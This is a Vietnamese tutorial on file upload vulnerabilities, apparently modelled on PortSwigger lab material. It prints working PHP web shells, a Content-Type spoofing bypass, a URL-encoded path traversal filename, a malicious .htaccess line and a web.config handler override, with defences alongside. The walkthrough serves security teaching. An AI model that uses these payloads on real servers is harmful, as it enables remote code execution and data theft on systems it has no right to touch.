---
title: "6.2 - File Upload"
date: 2026-05-14
category: "Tutorial"
series: "File-related Vulnerabilities"
seriesOrder: 6
tags: []
draft: false
---

### **Lỗ hỏng File Upload là gì?**

File upload vulnerablilities là khi máy chủ web cho phép những người dùng tải các file lên hệ thống của nó mà không có xác thực đầy đủ các thông tin như tên, loại, nội dung hay kích cỡ của chúng. Việc không thực thi đúng những hạn chế lên các đối tượng này còn có thể khiến cho ngay cả một chức năng tải hình ảnh cơ bản cũng có thể được sử dụng để tải lên các file tùy ý và có khả năng là những file thay thế nguy hiểm. Điều này cũng có thể bao gồm những tệp thay thế là những tệp cho phép điều khiển máy chủ từ xa.

Trong một vài trường hợp, hành động tải lên các file độc cũng đã đủ để gây thiệt hại. Các cuộc tấn công khác có thể liên quan đến yêu cầu HTML tiếp theo cho tệp, thường để kích hoạt việc thực thi mã độc từ máy chủ.

### **Tác động của lỗ hỏng File Upload là gì?**

Tác động của lỗ hỏng này nói chung là dựa vào 2 yếu tố sau:

* Phần nào của file mà web không thể xác nhận đúng, kể cả cho dù là kích cỡ, loại, nội dung,...
* Những hạn chế được áp đặt trên tệp một khi nó đã được tải lên thành công.

Trong trường hợp xấu nhất, loại tệp không được xác nhận đúng cách, và cấu hình máy chủ cho phép chứa các loại tệp như _.php_ và _.jsp_ để thực thi code. Trong trường hợp này, người tấn công có thể có khả năng tải lên file code từ phía máy chủ có chức năng như một web shell, cấp cho chúng toàn bộ quyền kiểm soát máy chủ.

Nếu như tên file không được xác thực đúng có thể cho phép người tấn công ghi đè lên những file đơn giản bằng cách tải lên các file có tên tương tự. Nếu server còn bị lỗi \[\[Path Traversal]] thì người tấn công còn có thể upload files đến những vị trí không lường trước được.

Không đảm bảo rằng kích thước của file phù hợp với ngưỡng mong đợi cũng có thể cho phép tấn công bằng \[\[DOS]], người tấn công sẽ tải lên rất nhiều file làm tràn bộ nhớ của máy chủ.

### **Upload File phát sinh như thế nào?**

Với những nguy hiểm rõ ràng đấy, bình thường trang web sẽ có những hạn chế cho tệp mà người dùng được phép tải lên. Thông thường hơn, các nhà phát triển sẽ triển khai những cơ chế mà họ tin là an toàn nhưng thực tế lại có những lỗ hỏng hoặc dễ dàng bị vượt qua.

Ví dụ, họ có thể cố gắng sử dụng danh sách đen (blacklist) để chặn các loại tệp nguy hiểm, nhưng lại bỏ sót các sai lệch trong quá trình phân tích cú pháp (parsing discrepancies) khi kiểm tra phần mở rộng của tệp. Như với bất kỳ danh sách đen nào, cũng rất dễ bỏ qua những loại tệp ít phổ biến hơn nhưng vẫn tiềm ẩn rủi ro bảo mật.

Trong các trường hợp khác, trang web có thể cố gắng kiểm tra loại tệp bằng cách xác minh các thuộc tính có thể dễ dàng bị giả mạo bởi kẻ tấn công thông qua các công cụ như Burp Proxy hoặc Repeater.

Cuối cùng, ngay cả khi có các biện pháp kiểm tra nghiêm ngặt, chúng vẫn có thể được áp dụng không nhất quán trên toàn bộ hệ thống các host và thư mục tạo nên trang web, dẫn đến các điểm không đồng bộ (discrepancies) mà kẻ tấn công có thể khai thác.

### **Máy chủ web xử lý các yêu cầu đối với tệp tĩnh như thế nào?**

Trước khi tìm hiểu cách khai thác các lỗ hổng tải tệp lên, bạn cần nắm được kiến thức cơ bản về cách máy chủ xử lý các yêu cầu (requests) đối với các tệp tĩnh (static files).

Trong quá khứ, các trang web hầu như chỉ bao gồm các tệp tĩnh được phục vụ trực tiếp cho người dùng khi họ gửi yêu cầu. Do đó, đường dẫn (path) của mỗi request có thể ánh xạ 1:1 với cấu trúc thư mục và tệp trên hệ thống tệp (filesystem) của máy chủ.

Ngày nay, các trang web ngày càng mang tính động (dynamic), và đường dẫn của request thường không còn liên quan trực tiếp đến hệ thống tệp nữa. Tuy nhiên, các máy chủ web vẫn phải xử lý một số request đến các tệp tĩnh, chẳng hạn như các tệp CSS, hình ảnh, v.v.

#### _ví dụ thực tế:_

**Tình huống:** Bạn truy cập một trang web tại địa chỉ: `https://example.com/images/logo.png`

**Trên trình duyệt:**

Trình duyệt gửi một **HTTP request** đến máy chủ để yêu cầu tệp `logo.png`:

```http
GET /images/logo.png HTTP/1.1
Host: example.com
```

**Trên máy chủ:**

Giả sử máy chủ web dùng là **Apache** hoặc **Nginx**, được cấu hình phục vụ các tệp tĩnh từ thư mục:

```css
/var/www/html/
```

\=> Máy chủ sẽ ánh xạ URL `/images/logo.png` đến:

```css
/var/www/html/images/logo.png
```

**Nếu file tồn tại:**

Máy chủ phản hồi lại trình duyệt:

```http
HTTP/1.1 200 OK
Content-Type: image/png
Content-Length: 83214

[binary data of the PNG image]
```

\=> Trình duyệt hiển thị hình ảnh `logo.png`.

**Nếu file không tồn tại:**

```http
HTTP/1.1 404 Not Found
Content-Type: text/html

<html>...File not found...</html>
```

**Ghi chú thêm:**

* Trình duyệt **không quan tâm** tệp đó có phải là thật trên server không, nó chỉ gửi request.
* Web server là bên chịu trách nhiệm ánh xạ đường dẫn URL sang đường dẫn trên **filesystem**.

####

Quy trình xử lý các tệp tĩnh về cơ bản vẫn không thay đổi. Ở một thời điểm nào đó, máy chủ sẽ phân tích (parse) đường dẫn trong yêu cầu (request) để xác định phần mở rộng của tệp (file extension). Sau đó, nó sẽ sử dụng phần mở rộng này để xác định loại tệp (file type) đang được yêu cầu, thường bằng cách so sánh với danh sách ánh xạ (mapping) được cấu hình sẵn giữa phần mở rộng và loại MIME (MIME type). Việc xử lý tiếp theo phụ thuộc vào loại tệp và cấu hình của máy chủ.

* **Nếu loại tệp là không thực thi (non-executable)**, chẳng hạn như hình ảnh hoặc trang HTML tĩnh, máy chủ sẽ chỉ gửi nội dung của tệp đó đến client thông qua phản hồi HTTP.
* **Nếu loại tệp là có thể thực thi (executable)**, như tệp PHP, và máy chủ được cấu hình để thực thi tệp loại này, nó sẽ gán các biến dựa trên header và tham số trong HTTP request trước khi chạy đoạn mã. Kết quả đầu ra sau khi thực thi có thể sẽ được gửi lại cho client qua HTTP response.
* **Nếu loại tệp là thực thi, nhưng máy chủ không được cấu hình để thực thi tệp loại đó**, thường thì nó sẽ phản hồi lỗi. Tuy nhiên, trong một số trường hợp cấu hình sai, nội dung của tệp vẫn có thể bị gửi đến client dưới dạng văn bản thuần (plain text). Những lỗi cấu hình như vậy đôi khi có thể bị khai thác để lộ mã nguồn hoặc thông tin nhạy cảm khác. Bạn có thể xem ví dụ về điều này trong phần tài liệu học về \[\[information disclosure]].

**Header `Content-Type` trong phản hồi HTTP có thể tiết lộ loại tệp mà máy chủ nghĩ rằng nó đang phục vụ.** Nếu header này không được thiết lập rõ ràng bởi mã ứng dụng, nó thường chứa giá trị được xác định từ ánh xạ giữa phần mở rộng và loại MIME.

### **Khai thác lỗ hổng tải tệp không giới hạn để triển khai web shell**

Từ góc độ bảo mật, **tình huống tồi tệ nhất** là khi một trang web cho phép bạn **tải lên các script phía máy chủ** như tệp PHP, Java, hoặc Python, **và máy chủ được cấu hình để thực thi chúng như mã nguồn**. Điều này khiến cho việc tạo một **web shell** trên máy chủ trở nên rất dễ dàng.

> #### **Web shell là gì?**
>
> **Web shell** là một đoạn mã độc hại (malicious script) cho phép kẻ tấn công **thực thi các lệnh tùy ý** (arbitrary commands) trên một web server từ xa, chỉ đơn giản bằng cách gửi **HTTP request** đến đúng endpoint.

#### Nếu bạn có thể tải thành công một web shell:

Bạn gần như có **quyền kiểm soát hoàn toàn** server, ví dụ:

* Đọc và ghi các tệp tùy ý trên hệ thống.
* Đánh cắp dữ liệu nhạy cảm (exfiltrate sensitive data).
* Dùng máy chủ bị chiếm quyền để **pivot (mở rộng tấn công)** vào hệ thống nội bộ hoặc các máy chủ khác bên ngoài mạng.

Ví dụ đơn giản về web shell PHP (đọc file):

```php
<?php echo file_get_contents('/path/to/target/file'); ?>
```

* Sau khi được upload, bạn chỉ cần gửi một HTTP request đến file này.
* Máy chủ sẽ trả về **nội dung của file mục tiêu** trong HTTP response.

Ví dụ web shell linh hoạt hơn:

```php
<?php echo system($_GET['command']); ?>
```

Script này cho phép bạn truyền lệnh hệ thống qua tham số query string. Ví dụ:

```http
GET /example/exploit.php?command=id HTTP/1.1
```

→ Máy chủ sẽ thực thi lệnh `id` và trả về kết quả, ví dụ:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

#### Cảnh báo:

* Dạng web shell này rất nguy hiểm, vì nó cho phép **Remote Code Execution (RCE)**.
* Nếu máy chủ chạy với quyền cao (root), hậu quả có thể nghiêm trọng hơn.

### **Khai thác kiểm tra tệp tải lên bị lỗi (Exploiting flawed validation of file uploads)**

Trên thực tế (in the wild), rất hiếm khi bạn gặp một trang web **không có bất kỳ cơ chế bảo vệ nào** chống lại các cuộc tấn công tải tệp lên, như ví dụ ở lab trước.

Tuy nhiên, **việc có cơ chế bảo vệ** không đồng nghĩa với việc **chúng thực sự mạnh mẽ hoặc an toàn**.

Trong một số trường hợp, bạn vẫn có thể **khai thác các lỗ hổng trong quá trình kiểm tra (validation)** để **tải lên một web shell**, từ đó thực hiện **remote code execution (RCE)** trên máy chủ.

Nói cách khác:\
Các website **thường có chặn phần mở rộng hoặc kiểm tra nội dung file**, nhưng nếu việc kiểm tra đó **bị thiết kế sai hoặc có thể bypass**, thì attacker vẫn có thể **lén lút tải file độc hại** lên máy chủ. (ví dụ .php thành .php.jpg).

**Giả sử có một biểu mẫu (form)** gồm các trường để:

* Tải lên một hình ảnh
* Nhập mô tả cho hình ảnh
* Nhập tên người dùng

Khi gửi biểu mẫu đó, yêu cầu (request) có thể sẽ trông như sau:

```kotlin
POST /images HTTP/1.1
Host: normal-website.com
Content-Length: 12345
Content-Type: multipart/form-data; boundary=---------------------------012345678901234567890123456

-----------------------------012345678901234567890123456
Content-Disposition: form-data; name="image"; filename="example.jpg"
Content-Type: image/jpeg

[...nội dung nhị phân của example.jpg...]

-----------------------------012345678901234567890123456
Content-Disposition: form-data; name="description"

This is an interesting description of my image.

-----------------------------012345678901234567890123456
Content-Disposition: form-data; name="username"

wiener
-----------------------------012345678901234567890123456--
```

**Giải thích:**

Như bạn có thể thấy, phần **message body (thân yêu cầu)** được **chia thành nhiều phần riêng biệt**, tương ứng với từng trường (field) trong biểu mẫu.

* Mỗi phần đều bắt đầu bằng một dòng chứa `boundary` (chuỗi ranh giới), giúp phân tách rõ ràng các phần dữ liệu.
* Mỗi phần bao gồm một **header `Content-Disposition`**, cung cấp thông tin về tên trường (`name="..."`) và tên file nếu có (`filename="..."`).
* Một số phần (đặc biệt là phần chứa tệp) còn có thêm **header `Content-Type`**, chỉ rõ kiểu MIME của dữ liệu được gửi.

_**Một cách mà các website có thể dùng để kiểm tra (validate) tệp tải lên**_**&#x20;là:**

**Kiểm tra header `Content-Type` riêng cho từng input** trong `multipart/form-data`, để xem nó có **khớp với loại MIME kỳ vọng** hay không.

Ví dụ: Nếu máy chủ **chỉ cho phép tải lên ảnh**, thì nó có thể chỉ chấp nhận các loại:

* `image/jpeg`
* `image/png`

***

**Vấn đề:**

Rắc rối xảy ra khi **máy chủ tin tưởng một cách tuyệt đối** vào giá trị của header `Content-Type` này.

> Nếu **không có bước kiểm tra bổ sung nào** để xác minh xem **nội dung thực sự của tệp** có đúng với loại MIME được khai báo hay không, thì cơ chế bảo vệ này **có thể dễ dàng bị vượt qua**.

**Cách khai thác (ví dụ với Burp Repeater):**

1. Trong quá trình upload file bằng trình duyệt, bạn chặn request bằng **Burp Suite**.
2. Dù bạn đang tải một file `.php`, bạn có thể chỉnh lại header trong phần upload:

```http
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg
```

3. Gửi lại request qua **Burp Repeater**.
4. Nếu server chỉ kiểm tra MIME từ header mà **không kiểm tra nội dung thật**, nó sẽ **chấp nhận file độc hại** với Content-Type giả mạo.

**Kết quả:**

* File `.php` độc hại được upload thành công với vỏ bọc là "ảnh".
* Nếu được lưu ở vị trí có thể truy cập và thực thi, bạn có thể chạy mã độc từ xa (RCE).

**Kết luận:**

* Không nên tin tưởng hoàn toàn vào `Content-Type` do client gửi lên.
* Server nên:
  * **Phân tích nội dung thực tế của file** (dựa trên magic bytes).
  * **Giới hạn phần mở rộng (extension)**.
  * **Tách riêng thư mục lưu trữ file** và **vô hiệu hóa thực thi** tại đó.

### **Ngăn chặn thực thi tệp trong các thư mục có thể truy cập bởi người dùng (Preventing file execution in user-accessible directories)**

Mặc dù **tốt nhất là ngăn chặn việc tải lên các loại tệp nguy hiểm ngay từ đầu**, nhưng **tuyến phòng thủ thứ hai** là đảm bảo rằng **máy chủ không thực thi bất kỳ script nào đã lỡ vượt qua được hàng rào bảo vệ**.

#### Biện pháp phòng ngừa phổ biến:

Các máy chủ web thường chỉ **thực thi những script có MIME type mà chúng được cấu hình rõ ràng để thực thi** (ví dụ như `application/x-php` cho PHP).

Nếu gặp phải tệp mà server **không được cấu hình để xử lý**, nó có thể:

* Trả về thông báo lỗi, **hoặc**
* Trả lại **nội dung file dưới dạng văn bản thuần (plain text)**.

#### Ví dụ:

Request:

```bash
GET /static/exploit.php?command=id HTTP/1.1
Host: normal-website.com
```

Response (máy chủ KHÔNG thực thi được file `.php`):

```php
HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: 39

<?php echo system($_GET['command']); ?>
```

#### Ý nghĩa:

* Server không thực thi file `.php`, mà **trả nguyên nội dung mã nguồn về dưới dạng text**.
* Đây là **hành vi mong muốn** trong các thư mục upload — vì nó ngăn không cho attacker dùng web shell.

#### Kết luận:

* Nên cấu hình các thư mục mà người dùng có thể tải tệp lên (**/uploads**, **/static**, ...) sao cho:
  * Không cho phép thực thi script.
  * Trả về dạng `text/plain` nếu có ai đó cố truy cập file `.php`, `.jsp`, `.py`...

**Hành vi này (hiển thị mã nguồn thay vì thực thi)** tuy có thể gây rò rỉ mã nguồn (source code leak), nhưng **nó cũng vô hiệu hóa hoàn toàn mọi nỗ lực tạo web shell.**

Cấu hình như vậy **thường khác nhau giữa các thư mục** trên hệ thống:

* Các thư mục cho phép người dùng tải lên file (upload) thường được **kiểm soát rất nghiêm ngặt** để ngăn thực thi mã.
* Trong khi đó, **các thư mục khác trên hệ thống – nơi không dự kiến chứa file từ người dùng** – có thể có **cấu hình “lỏng lẻo” hơn**, và **cho phép thực thi script**.

> Nếu bạn tìm được cách **tải một script (ví dụ `.php`) vào thư mục không dành cho người dùng**, thì rất có thể server **sẽ thực thi được script đó**, và bạn **khai thác được web shell**.

**Mẹo:**

* Máy chủ web thường sử dụng **trường `filename` trong `multipart/form-data`** để xác định **tên file** và **vị trí lưu trữ** trên hệ thống.

→ Điều này nghĩa là **việc bạn chỉnh sửa trường `filename`** có thể ảnh hưởng tới **nơi file được lưu** trên máy chủ. Từ đó dẫn tới lỗ hổng nếu server xử lý không an toàn (ví dụ: path traversal, hoặc upload vào thư mục ngoài tầm kiểm soát).

Ngoài ra, bạn cần lưu ý:

* Dù bạn **gửi tất cả request đến cùng một tên miền**, ví dụ `example.com`, nhưng:
  * Tên miền đó **thường trỏ đến một reverse proxy** như **load balancer**.
  * Request của bạn có thể được chuyển tiếp đến **nhiều máy chủ khác nhau ở phía sau**, và **mỗi server có thể có cấu hình khác nhau**.

Ý nghĩa thực tiễn:

1. Bạn có thể **tải file vào thư mục không an toàn** bằng cách:
   * Sửa giá trị `filename=...`
   * Kết hợp với lỗi path traversal (`../../`)
   * Lợi dụng cấu hình proxy/backend không đồng bộ
2. Nếu cấu hình giữa các máy chủ không giống nhau:
   * Một máy từ chối thực thi file
   * Máy khác phía sau có thể **cho phép thực thi**, dẫn tới **Remote Code Execution (RCE)**

#### **Mục tiêu**:

**Upload file PHP lên máy chủ**, né tránh thư mục `/files/avatars/` vốn không thực thi được mã, **di chuyển lên thư mục `/files/`**, nơi **file PHP có thể được thực thi**, và **đọc file `/home/carlos/secret`**.

#### **Các bước khai thác cụ thể**:

**Bước 1: Upload ảnh đại diện bình thường**

* Đăng nhập vào tài khoản
* Tải lên một ảnh đại diện `.jpg`
* Trở về trang tài khoản → server gửi request `GET /files/avatars/<your-image>.jpg`

**Bước 2: Kiểm tra lại request trong Burp**

* Vào **Proxy > HTTP History** → chọn request GET ảnh
* Send to **Repeater**

**Bước 3: Tạo web shell PHP cục bộ**

Tạo file `exploit.php` với nội dung:

```php
`<?php echo file_get_contents('/home/carlos/secret'); ?>`
```

**Bước 4: Upload `exploit.php` làm ảnh đại diện**

* Server không ngăn bạn upload file `.php`

**Bước 5: Truy cập `GET /files/avatars/exploit.php` trong Repeater**

* Server **không thực thi script**, chỉ trả về nội dung file dưới dạng text → `/files/avatars/` KHÔNG cho thực thi PHP.

#### Khai thác Path Traversal

**Bước 6: Tìm lại request upload file (POST `/my-account/avatar`)**

* Gửi sang **Repeater**

**Bước 7: Thay đổi tên file trong request body:**

**Trước:**

```http
`filename="exploit.php"`
```

**Thử lần 1 (bypass thất bại):**

```http
`filename="../exploit.php"`
```

→ Server strip chuỗi `../` → file vẫn bị lưu tại `/avatars/`

**Thử lần 2 (bypass thành công):**

```http
`filename="..%2fexploit.php"`
```

→ `%2f` là ký tự `/` đã **URL encode**

Kết quả: Server decode `%2f` và **chấp nhận ghi file ra ngoài thư mục avatars**:

```bash
`The file avatars/../exploit.php has been uploaded.`
```

→ Tương đương với: `/files/exploit.php`

#### **Truy cập script thực thi**

* Gửi request `GET /files/avatars/..%2fexploit.php`\
  → Mã PHP được thực thi → **Trả về nội dung của `/home/carlos/secret`**

Ta cũng có thể truy cập trực tiếp:

```bash
`GET /files/exploit.php`
```

#### Bước cuối:

**Copy nội dung bí mật (secret)** từ kết quả, và **gửi để hoàn thành lab**.

### Blacklist không đầy đủ các loại tệp nguy hiểm

(**Insufficient blacklisting of dangerous file types**)

Một trong những cách phổ biến và rõ ràng nhất để ngăn người dùng tải lên các **script độc hại** là sử dụng **blacklist (danh sách chặn)** các phần mở rộng tệp nguy hiểm như `.php`.

Tuy nhiên, phương pháp **blacklist là không đáng tin cậy**, bởi vì:

* Rất khó để **liệt kê đầy đủ tất cả phần mở rộng** có thể bị lợi dụng để thực thi mã trên máy chủ.
* Kẻ tấn công có thể **lách danh sách chặn** bằng cách sử dụng **các phần mở rộng ít phổ biến hơn nhưng vẫn có thể được thực thi**, chẳng hạn như:
  * `.php5`
  * `.phtml`
  * `.shtml`
  * `.php3`, `.phar`, v.v.

#### Ví dụ tình huống:

Giả sử máy chủ chặn `.php`, nhưng lại bỏ sót `.php5`. Nếu máy chủ vẫn cấu hình để xử lý `.php5` như một file PHP thông thường, thì attacker có thể upload shell với phần mở rộng `.php5` và thực thi bình thường.

#### Bài học rút ra:

* **Blacklisting không đủ mạnh để ngăn tấn công file upload.**
* Nên sử dụng **whitelisting** (chỉ cho phép một số định dạng an toàn như `.jpg`, `.png`, `.pdf`,...) và kết hợp với:
  * Xác minh MIME type thực sự
  * Phân tích nội dung file
  * Đổi tên file sau khi upload
  * Cấu hình server không cho thực thi file trong thư mục upload

### **Ghi đè cấu hình máy chủ**

(**Overriding the server configuration**)

Như đã đề cập ở phần trước, các máy chủ (servers) thông thường **sẽ không thực thi các tệp** trừ khi **được cấu hình rõ ràng để làm như vậy**.

Ví dụ, để một **máy chủ Apache** có thể thực thi các tệp PHP được client yêu cầu, lập trình viên có thể phải thêm các dòng cấu hình sau vào file `**/etc/apache2/apache2.conf**`:

```apacheconf
LoadModule php_module /usr/lib/apache2/modules/libphp.so 
AddType application/x-httpd-php .php
```

***

#### Ghi đè cấu hình theo thư mục

Nhiều máy chủ web cho phép lập trình viên **tạo các tệp cấu hình riêng trong từng thư mục** để **ghi đè hoặc bổ sung các cài đặt toàn cục (global settings)**.

Ví dụ, máy chủ **Apache** sẽ tự động đọc và áp dụng cấu hình trong file có tên **`.htaccess`** nếu file này tồn tại trong thư mục đang được truy cập.

***

### Ý nghĩa trong bảo mật:

Nếu attacker có thể **upload được một file `.htaccess`**, họ có thể:

* **Thay đổi cách máy chủ xử lý các loại tệp** (ví dụ, ép server thực thi file `.jpg` như `.php`)
* **Bật thực thi script ở thư mục upload** — vốn đáng lẽ phải bị vô hiệu hóa

→ Đây là kỹ thuật **gian lận cấu hình (configuration override)** cực kỳ nguy hiểm nếu server không có biện pháp kiểm soát chặt chẽ.

***

### Phòng chống:

* Không cho phép người dùng upload file `.htaccess` hoặc các file cấu hình khác
* Không cho phép ghi đè MIME type/handler qua `.htaccess` trong thư mục upload
* Cấu hình `AllowOverride None` trong Apache để vô hiệu `.htaccess` tại thư mục nguy hiểm

### **Ghi đè cấu hình thư mục trên máy chủ IIS**

(**Similarly, developers can make directory-specific configuration on IIS servers using a web.config file.**)

Tương tự như trên máy chủ Apache với file `.htaccess`, **lập trình viên cũng có thể thiết lập cấu hình riêng cho từng thư mục trên máy chủ IIS** (Internet Information Services – của Microsoft) thông qua file **`web.config`**.

Ví dụ dưới đây là một chỉ thị (directive) cấu hình MIME type, cho phép **các file `.json` được máy chủ phục vụ (serve) cho người dùng**:

```xml
<staticContent>
    <mimeMap fileExtension=".json" mimeType="application/json" />
</staticContent>
```

***

#### Máy chủ web sẽ sử dụng các file cấu hình dạng này nếu chúng tồn tại trong thư mục tương ứng.

**Tuy nhiên, bạn thường sẽ không thể truy cập trực tiếp các file cấu hình này thông qua HTTP (vì bị chặn bởi server).**

***

### Rủi ro bảo mật

Đôi khi, **máy chủ cấu hình sai** hoặc **thiếu cơ chế kiểm tra**, khiến bạn có thể **upload được một file cấu hình `web.config` độc hại** vào thư mục được xử lý bởi IIS.

Trong trường hợp này, **kể cả khi phần mở rộng file thực thi như `.php`, `.aspx`... bị blacklist**, vẫn có thể:

**Tự định nghĩa một phần mở rộng tùy ý (ví dụ `.lol`)**\
rồi **ép máy chủ ánh xạ nó sang một loại MIME thực thi được**(ví dụ: `application/x-asp-net`).

***

#### Ví dụ nguy hiểm:

Giả sử upload được file `web.config` như sau:

```xml
<configuration>
  <system.webServer>
    <handlers>
      <add name="exec" path="*.lol" verb="*" type="System.Web.UI.PageHandlerFactory" resourceType="Unspecified" />
    </handlers>
  </system.webServer>
</configuration>

```

→ Giờ nếu bạn upload file `shell.lol` chứa mã ASP.NET, thì máy chủ sẽ thực thi file `.lol` như một file `.aspx`.

***

### Phòng chống:

* Không cho phép upload các file cấu hình như `.htaccess`, `web.config`
* Giới hạn loại MIME xử lý tại từng thư mục
* Chạy server với quyền thấp, tách biệt quyền ghi và quyền thực thi

## Payload thường dùng:

script để lấy thông tin của file:

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

Nếu server kiểu Apache: (thêm file .htaccess để cấu hình lại server có thể cho phép file .png)

```
AddType application/x-httpd-php .png
```

đổi đường \`Content-Type\` hành \`text/plain\`